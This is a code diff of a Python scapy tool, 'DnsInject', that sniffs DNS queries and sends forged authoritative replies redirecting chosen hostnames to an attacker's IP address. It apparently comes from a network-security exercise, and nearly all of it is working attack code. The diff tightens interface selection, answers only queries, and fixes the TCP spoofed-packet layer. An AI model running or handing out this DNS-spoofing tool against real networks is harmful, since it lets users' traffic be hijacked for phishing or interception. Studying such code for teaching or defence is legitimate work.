@@ -2,9 +2,8 @@
 
 from scapy.all import *
 from optparse import OptionParser
-import socket
 import netifaces
-
+from netifaces import  ifaddresses, AF_INET
 
 # http://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html
 # https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
@@ -14,15 +13,20 @@ class DnsInject:
         self.interface = interface
 
         if self.interface is None:
-            interfaces = netifaces.interfaces()
-            interfaces.remove("lo")
-            self.interface = str(interfaces[0])
-
+            interfaces_list = netifaces.interfaces()
+            interfaces_list.remove("lo")
+            for interface in interfaces_list:
+                addresses = [ i['addr'] for i in ifaddresses(interface).setdefault(AF_INET, [{'addr': 'No IP addr'}])]
+                if addresses != "No IP addr":
+                    self.interface = interface
+        self.ip = str(self.get_local_ip())
         self.host = hosts
         self.expression = expression
         self.host_dict = {}
         if self.host is not None:
             self.parse_host()
+        print self.interface, self.ip
+
 
     def parse_host(self):
         if os.path.exists(self.host):
@@ -34,12 +38,18 @@ class DnsInject:
             file.close()
 
     def start_dnsspoof(self):
-        local_ip = self.get_local_ip()
 
         def dns_callback(packet):
-            if packet.haslayer(DNSQR):
-                if packet[DNS].qd.qname in self.host_dict:
+
+            if packet.haslayer(DNSQR) and packet.haslayer(DNS) and packet[DNS].qr == 0:
+
+                if packet[DNS].qd.qname in self.host_dict and self.host_dict is not None:
                     local_ip = str(self.host_dict[packet[DNS].qd.qname])
+                elif self.host_dict is None:
+                    local_ip = self.ip
+                else:
+                    return
+
                 if packet.haslayer(UDP) and packet.haslayer(IP):
                     spoofed_packet = \
                         IP(dst=packet[IP].src,
@@ -49,7 +59,7 @@ class DnsInject:
                         DNS(id=packet[DNS].id,
                             qd=packet[DNS].qd,
                             aa=1,
-                            qr=1, \
+                                qr=1, \
                             an=DNSRR(
                                 rrname=packet[DNS].qd.qname,
                                 ttl=10,
@@ -61,7 +71,7 @@ class DnsInject:
                     spoofed_packet = \
                         IP(dst=packet[IP].src,
                            src=packet[IP].dst) / \
-                        UDP(dport=packet[TCP].sport,
+                        TCP(dport=packet[TCP].sport,
                             sport=packet[TCP].dport) / \
                         DNS(id=packet[DNS].id,
                             qd=packet[DNS].qd,
@@ -80,14 +90,14 @@ class DnsInject:
             filter=self.expression,
             prn=dns_callback,
             store=0,
-            iface=self.interface
+            iface=str(self.interface)
         )
 
     def get_local_ip(self):
-        # return "127.0.0.1"
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        return s.getsockname()[0]
+
+        netifaces.ifaddresses(self.interface)
+        ip = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']
+        return ip
 
 
 if __name__ == '__main__':
